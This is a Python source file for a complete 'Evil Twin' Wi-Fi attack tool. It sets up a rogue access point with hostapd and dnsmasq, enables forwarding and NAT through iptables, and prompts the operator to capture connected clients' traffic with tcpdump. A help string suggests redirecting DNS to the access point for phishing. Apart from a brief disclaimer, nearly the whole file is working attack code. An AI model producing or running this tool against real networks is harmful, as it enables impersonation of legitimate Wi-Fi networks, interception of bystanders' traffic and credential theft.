# modules/evil_twin.py

import subprocess
import os
import sys
import shutil
import time
import tempfile
import argparse
import signal

# --- Configuration ---
HOSTAPD_COMMAND = "hostapd"
DNSMASQ_COMMAND = "dnsmasq"
IPTABLES_COMMAND = "iptables"
SYSCTL_COMMAND = "sysctl"
IP_COMMAND = "ip"
# ---------------------

# Store Popen objects for cleanup
running_processes = []
temp_config_files = []


def check_tool_installed(name):
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it.")
        return False
    return True


def run_command(command, use_sudo=True, check=False, capture_output=False, text=True):
    """Helper to run shell commands."""
    cmd_list = command
    if use_sudo and os.geteuid() != 0:  # Only add sudo if not already root and use_sudo is True
        if not check_tool_installed("sudo"):
            print("[!] 'sudo' command not found, but required.")
            return None  # Or raise an exception
        cmd_list = ["sudo"] + command

    print(f"[*] Executing: {' '.join(cmd_list)}")
    try:
        if capture_output:
            return subprocess.run(cmd_list, check=check, capture_output=True, text=text)
        else:
            return subprocess.run(cmd_list, check=check, text=text)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error executing command: {' '.join(cmd_list)}")
        print(f"    Return code: {e.returncode}")
        if e.stdout: print(f"    Stdout: {e.stdout}")
        if e.stderr: print(f"    Stderr: {e.stderr}")
        return e
    except FileNotFoundError:
        print(f"[!] Error: Command '{cmd_list[0]}' not found.")
        return None


def start_daemon(command, use_sudo=True, cwd=None):
    """Helper to start daemon processes."""
    global running_processes
    cmd_list = command
    if use_sudo and os.geteuid() != 0:
        if not check_tool_installed("sudo"):
            print("[!] 'sudo' command not found, but required.")
            return None
        cmd_list = ["sudo"] + command

    print(f"[*] Starting daemon: {' '.join(cmd_list)}")
    try:
        # For daemons, we usually don't want their output to clutter the main script's stdout/stderr
        # unless debugging. Redirecting to DEVNULL or a log file is common.
        process = subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=cwd)
        running_processes.append(process)
        time.sleep(1)  # Give a moment for the daemon to start / fail
        if process.poll() is not None:  # Check if process terminated immediately
            print(f"[!] Failed to start daemon: {' '.join(cmd_list)}. Process exited with code {process.returncode}.")
            running_processes.remove(process)
            return None
        print(f"[+] Daemon '{cmd_list[-1]}' started with PID {process.pid}.")
        return process
    except FileNotFoundError:
        print(f"[!] Error: Command '{cmd_list[0]}' not found for daemon.")
        return None
    except Exception as e:
        print(f"[!] Exception starting daemon '{cmd_list[0]}': {e}")
        return None


class EvilTwinAttack:
    def __init__(self, ap_interface, internet_interface, essid,
                 channel=6, passphrase=None,
                 ap_ip="10.0.0.1", netmask="255.255.255.0",
                 dhcp_range_start="10.0.0.10", dhcp_range_end="10.0.0.50",
                 dns_server="8.8.8.8"):  # External DNS for clients

        self.ap_interface = ap_interface
        self.internet_interface = internet_interface
        self.essid = essid
        self.channel = channel
        self.passphrase = passphrase
        self.ap_ip = ap_ip
        self.netmask = netmask
        self.dhcp_range_start = dhcp_range_start
        self.dhcp_range_end = dhcp_range_end
        self.dns_server = dns_server  # DNS server clients will use

        self.hostapd_conf_path = None
        self.dnsmasq_conf_path = None
        self.original_ip_forward = None

    def _check_prerequisites(self):
        print("[*] Checking prerequisites...")
        if os.geteuid() != 0:
            print("[!] This script requires root privileges for network configuration and raw socket access.")
            print("[!] Please run with sudo or as root.")
            # For simplicity, many commands below will use sudo if not root.
            # A stricter check would be to exit here if not root.
            # For now, we rely on individual commands using sudo.

        tools = [HOSTAPD_COMMAND, DNSMASQ_COMMAND, IPTABLES_COMMAND, SYSCTL_COMMAND, IP_COMMAND]
        if os.geteuid() != 0: tools.append("sudo")  # Ensure sudo is checked if not root

        for tool in tools:
            if not check_tool_installed(tool):
                return False
        print("[+] All required tools seem to be installed.")
        return True

    def _generate_hostapd_conf(self):
        global temp_config_files
        conf_content = f"""
interface={self.ap_interface}
driver=nl80211
ssid={self.essid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        if self.passphrase:
            conf_content += f"""
wpa=2
wpa_passphrase={self.passphrase}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
"""
        else:  # Open AP
            pass  # Default is open

        try:
            with tempfile.NamedTemporaryFile(mode="w", delete=False, prefix="hostapd_", suffix=".conf") as tmp_conf:
                tmp_conf.write(conf_content)
                self.hostapd_conf_path = tmp_conf.name
            temp_config_files.append(self.hostapd_conf_path)
            print(f"[+] Generated hostapd config: {self.hostapd_conf_path}")
            return True
        except Exception as e:
            print(f"[!] Error generating hostapd config: {e}")
            return False

    def _generate_dnsmasq_conf(self):
        global temp_config_files
        conf_content = f"""
interface={self.ap_interface}
#bind-interfaces # Important for dnsmasq not to listen on all interfaces
dhcp-range={self.dhcp_range_start},{self.dhcp_range_end},12h
dhcp-option=option:router,{self.ap_ip}
dhcp-option=option:dns-server,{self.dns_server} 
# To redirect all DNS to a specific IP (e.g., for captive portal):
# address=/#/{self.ap_ip} 
# To use system's resolv.conf for upstream DNS (if not redirecting all):
#resolv-file=/etc/resolv.conf 
#no-resolv # If you want dnsmasq to not use /etc/resolv.conf
server={self.dns_server} # Explicitly set upstream DNS server for dnsmasq itself
log-dhcp # Optional: for debugging
"""
        try:
            with tempfile.NamedTemporaryFile(mode="w", delete=False, prefix="dnsmasq_", suffix=".conf") as tmp_conf:
                tmp_conf.write(conf_content)
                self.dnsmasq_conf_path = tmp_conf.name
            temp_config_files.append(self.dnsmasq_conf_path)
            print(f"[+] Generated dnsmasq config: {self.dnsmasq_conf_path}")
            return True
        except Exception as e:
            print(f"[!] Error generating dnsmasq config: {e}")
            return False

    def _configure_network(self, enable=True):
        print(f"[*] {'Enabling' if enable else 'Disabling'} network configurations...")

        # 1. Configure AP Interface IP
        if enable:
            # Bring interface down before changing IP, then up
            run_command([IP_COMMAND, "link", "set", self.ap_interface, "down"])
            run_command([IP_COMMAND, "addr", "flush", "dev", self.ap_interface])  # Flush old IPs
            if run_command([IP_COMMAND, "addr", "add", f"{self.ap_ip}/{self.netmask}", "dev",
                            self.ap_interface]) is None: return False
            if run_command([IP_COMMAND, "link", "set", self.ap_interface, "up"]) is None: return False
            print(f"[+] Configured {self.ap_interface} with IP {self.ap_ip}/{self.netmask}")
        else:  # On cleanup, just bring interface down, flushing handled by reboot or NetworkManager
            run_command([IP_COMMAND, "addr", "flush", "dev", self.ap_interface])
            run_command([IP_COMMAND, "link", "set", self.ap_interface, "down"])
            print(f"[+] Flushed IP from {self.ap_interface} and brought it down.")

        # 2. IP Forwarding
        if enable:
            # Save current forwarding state
            res = run_command([SYSCTL_COMMAND, "-n", "net.ipv4.ip_forward"], capture_output=True)
            if res and res.stdout:
                self.original_ip_forward = res.stdout.strip()

            if run_command([SYSCTL_COMMAND, "-w", "net.ipv4.ip_forward=1"]) is None: return False
            print("[+] Enabled IP forwarding.")
        else:
            if self.original_ip_forward is not None:
                run_command([SYSCTL_COMMAND, "-w", f"net.ipv4.ip_forward={self.original_ip_forward}"])
                print(f"[+] Restored IP forwarding to original state ({self.original_ip_forward}).")
            else:  # If original wasn't captured, default to disabling it
                run_command([SYSCTL_COMMAND, "-w", "net.ipv4.ip_forward=0"])
                print("[+] Disabled IP forwarding (original state unknown).")

        # 3. IPTables NAT rules
        nat_rules = [
            (["-t", "nat", "-A", "POSTROUTING", "-o", self.internet_interface, "-j", "MASQUERADE"], enable),
            (["-A", "FORWARD", "-i", self.ap_interface, "-o", self.internet_interface, "-m", "state", "--state",
              "RELATED,ESTABLISHED", "-j", "ACCEPT"], enable),
            (["-A", "FORWARD", "-i", self.internet_interface, "-o", self.ap_interface, "-j", "ACCEPT"], enable)
            # Allow established from internet to AP clients
        ]
        # Alternative more restrictive FORWARD rule for internet_interface -> ap_interface:
        # (["-A", "FORWARD", "-i", self.internet_interface, "-o", self.ap_interface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], enable)

        for rule_parts, add_rule in nat_rules:
            action = "-A" if add_rule else "-D"  # -A to Add, -D to Delete
            # Ensure rule is applied only if 'enable' matches 'add_rule' logic
            if (enable and add_rule) or (not enable and add_rule):  # add_rule is True meaning it's an enabling rule
                if run_command([IPTABLES_COMMAND, action] + rule_parts) is None:
                    # If disabling and rule doesn't exist, it's not a fatal error for cleanup
                    if enable: return False
            # If disabling, we always try to delete. If 'add_rule' was false it means it wasn't an "enable" rule to begin with.
            # This logic is a bit complex, simpler: if enable, add. if not enable, delete.

        # Simplified IPTables logic:
        if enable:
            run_command([IPTABLES_COMMAND, "-t", "nat", "-F"])  # Flush NAT table first (optional, can be disruptive)
            run_command([IPTABLES_COMMAND, "-F", "FORWARD"])  # Flush FORWARD chain (optional)
            if run_command([IPTABLES_COMMAND, "-t", "nat", "-A", "POSTROUTING", "-o", self.internet_interface, "-j",
                            "MASQUERADE"]) is None: return False
            if run_command(
                [IPTABLES_COMMAND, "-A", "FORWARD", "-i", self.ap_interface, "-o", self.internet_interface, "-m",
                 "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"]) is None: return False
            if run_command(
                [IPTABLES_COMMAND, "-A", "FORWARD", "-i", self.internet_interface, "-o", self.ap_interface, "-j",
                 "ACCEPT"]) is None: return False  # More permissive
            print("[+] Configured IPTables NAT rules.")
        else:  # Cleanup
            run_command(
                [IPTABLES_COMMAND, "-t", "nat", "-D", "POSTROUTING", "-o", self.internet_interface, "-j", "MASQUERADE"])
            run_command(
                [IPTABLES_COMMAND, "-D", "FORWARD", "-i", self.ap_interface, "-o", self.internet_interface, "-m",
                 "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
            run_command(
                [IPTABLES_COMMAND, "-D", "FORWARD", "-i", self.internet_interface, "-o", self.ap_interface, "-j",
                 "ACCEPT"])
            print("[+] Cleared IPTables NAT rules.")
        return True

    def start(self):
        print("[*] Starting Evil Twin Attack...")
        if not self._check_prerequisites(): return False
        if not self._generate_hostapd_conf(): return False
        if not self._generate_dnsmasq_conf(): return False

        # Kill interfering processes (NetworkManager, wpa_supplicant) for ap_interface
        # This is advanced and can be destructive. User should ideally prepare the interface.
        # Example: run_command(["nmcli", "dev", "set", self.ap_interface, "managed", "no"], use_sudo=True)
        # Example: run_command(["killall", "wpa_supplicant"], use_sudo=True)
        print(
            f"[!] Warning: Ensure that NetworkManager or other network daemons are not managing '{self.ap_interface}'.")
        print(f"[!] You might need to stop them manually (e.g., 'sudo systemctl stop NetworkManager').")

        if not self._configure_network(enable=True):
            print("[!] Failed to configure network settings.")
            self.stop()  # Attempt cleanup
            return False

        print("[*] Starting HostAP daemon...")
        if not start_daemon([HOSTAPD_COMMAND, self.hostapd_conf_path]):
            print("[!] Failed to start hostapd.")
            self.stop()
            return False

        print("[*] Starting DNSMasq daemon...")
        # DNSMasq needs the interface to be up with an IP already.
        # The -C flag tells dnsmasq to use a specific config file.
        # The -d flag runs it in debug mode (stays in foreground, prints to terminal).
        # Without -d, it daemonizes. For Popen, we want it to stay in foreground relative to Popen.
        # Adding --no-daemon makes dnsmasq stay in foreground for Popen.
        if not start_daemon([DNSMASQ_COMMAND, "-C", self.dnsmasq_conf_path, "--no-daemon"]):
            print("[!] Failed to start dnsmasq.")
            self.stop()
            return False

        print("\n[SUCCESS] Evil Twin AP should be up and running!")
        print(f"    ESSID: {self.essid}")
        print(f"    AP Interface: {self.ap_interface} ({self.ap_ip})")
        print(f"    Internet via: {self.internet_interface}")
        print(f"    DHCP Range: {self.dhcp_range_start} - {self.dhcp_range_end}")
        if self.passphrase:
            print(f"    Passphrase: {self.passphrase}")
        else:
            print("    Security: Open")
        print("\n[*] Clients connecting to this AP will get internet access.")
        print("[*] You can now run sniffing tools (e.g., Wireshark, tcpdump) on " + self.ap_interface)
        print("    Example: sudo tcpdump -i " + self.ap_interface + " -w evil_twin_capture.pcap")
        print("\nPress Ctrl+C to stop the attack and clean up...")
        return True

    def stop(self):
        print("\n[*] Stopping Evil Twin Attack and cleaning up...")
        global running_processes, temp_config_files

        for p in reversed(running_processes):  # Stop in reverse order of start
            if p.poll() is None:  # If process is still running
                print(f"[*] Terminating process {p.pid} ({p.args[0] if isinstance(p.args, list) else p.args})...")
                # p.terminate() # SIGTERM
                os.kill(p.pid, signal.SIGTERM)  # More reliable for sudo processes started by non-root script with sudo
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    print(f"[!] Process {p.pid} did not terminate gracefully, sending SIGKILL.")
                    # p.kill() # SIGKILL
                    os.kill(p.pid, signal.SIGKILL)
                    p.wait()
        running_processes.clear()

        self._configure_network(enable=False)  # Restore network settings

        for f_path in temp_config_files:
            try:
                if os.path.exists(f_path):
                    os.remove(f_path)
                    print(f"[+] Removed temporary config file: {f_path}")
            except Exception as e:
                print(f"[!] Error removing temp file {f_path}: {e}")
        temp_config_files.clear()

        print("[+] Cleanup complete.")
        # Consider re-enabling NetworkManager or other services if they were stopped.
        # Example: run_command(["nmcli", "dev", "set", self.ap_interface, "managed", "yes"], use_sudo=True)
        # Example: run_command(["systemctl", "start", "NetworkManager"], use_sudo=True)
        print(f"[!] If you manually stopped NetworkManager or other services, you may need to restart them.")


# --- Main execution for demonstration ---
def main():
    parser = argparse.ArgumentParser(
        description="Evil Twin Attack Framework using hostapd and dnsmasq.",
        epilog="Example: sudo python3 evil_twin.py wlan1 eth0 MyEvilAP --passphrase 'password123'"
    )
    parser.add_argument("ap_interface", help="Wireless interface for the Evil AP (e.g., wlan1). Must support AP mode.")
    parser.add_argument("internet_interface", help="Interface providing internet connectivity (e.g., eth0, wlan0).")
    parser.add_argument("essid", help="ESSID (Name) of the Evil AP.")
    parser.add_argument("-c", "--channel", type=int, default=6, help="Channel for the AP (default: 6).")
    parser.add_argument("-p", "--passphrase", help="WPA2 passphrase for the AP. If omitted, AP will be open.")
    parser.add_argument("--ap-ip", default="10.0.0.1", help="IP address for the Evil AP (default: 10.0.0.1).")
    parser.add_argument("--netmask", default="24",
                        help="Netmask for AP IP in CIDR notation (e.g. 24 for 255.255.255.0, default: 24).")
    parser.add_argument("--dhcp-start", default="10.0.0.10", help="DHCP range start IP (default: 10.0.0.10).")
    parser.add_argument("--dhcp-end", default="10.0.0.50", help="DHCP range end IP (default: 10.0.0.50).")
    parser.add_argument("--dns", default="8.8.8.8",
                        help="DNS server for clients (default: 8.8.8.8). Use your AP_IP to point to a local DNS for phishing.")

    args = parser.parse_args()

    # Convert CIDR netmask to dotted decimal for ip command
    try:
        prefix = int(args.netmask)
        if not (0 <= prefix <= 32):
            raise ValueError
        bits = 0xffffffff ^ (1 << (32 - prefix)) - 1
        netmask_dotted = f"{(bits >> 24) & 0xff}.{(bits >> 16) & 0xff}.{(bits >> 8) & 0xff}.{bits & 0xff}"
    except ValueError:
        print(f"[!] Invalid netmask CIDR: {args.netmask}. Please use a value between 0 and 32.")
        sys.exit(1)

    print("=======================================================")
    print("                 Evil Twin Attack Tool                 ")
    print("=======================================================")
    print("Disclaimer: This script is for educational purposes ONLY.")
    print("Using this tool against networks or individuals without")
    print("explicit permission is illegal and unethical.")
    print("The user assumes all responsibility for their actions.")
    print("=======================================================\n")

    if os.geteuid() != 0:
        print("[!] This script needs to be run with sudo or as root to manage network interfaces and daemons.")
        print("    Example: sudo python3 evil_twin.py ...")
        # sys.exit(1) # Could exit here, or let individual sudo commands handle it.
        # For this comprehensive script, it's better to enforce root from the start.
        # However, the script uses 'sudo' internally, so running the script itself as root
        # vs. running as a user with sudo privileges for specific commands are different.
        # The current `run_command` and `start_daemon` add `sudo` if not already root.

    attack = EvilTwinAttack(
        ap_interface=args.ap_interface,
        internet_interface=args.internet_interface,
        essid=args.essid,
        channel=args.channel,
        passphrase=args.passphrase,
        ap_ip=args.ap_ip,
        netmask=netmask_dotted,  # Use the converted netmask
        dhcp_range_start=args.dhcp_start,
        dhcp_range_end=args.dhcp_end,
        dns_server=args.dns
    )

    def signal_handler(sig, frame):
        print("\n[!] Ctrl+C detected. Shutting down...")
        attack.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C
    signal.signal(signal.SIGTERM, signal_handler)  # Handle termination signal

    if attack.start():
        try:
            # Keep the main thread alive while daemons are running
            while True:
                time.sleep(1)
                # Check if any critical daemon died
                for proc in running_processes:
                    if proc.poll() is not None:  # Process has exited
                        print(
                            f"[!] Critical daemon (PID: {proc.pid}, CMD: {proc.args[0] if isinstance(proc.args, list) else proc.args}) has died unexpectedly!")
                        print("[!] Attempting to stop all services.")
                        attack.stop()
                        sys.exit(1)
        except Exception as e:  # Catch any other exception during the main loop
            print(f"[!] An unexpected error occurred during attack: {e}")
        finally:
            attack.stop()  # Ensure cleanup on any exit from the loop
    else:
        print("[!] Failed to start the Evil Twin attack.")
        attack.stop()  # Ensure cleanup even if start failed partially


if __name__ == "__main__":
    main()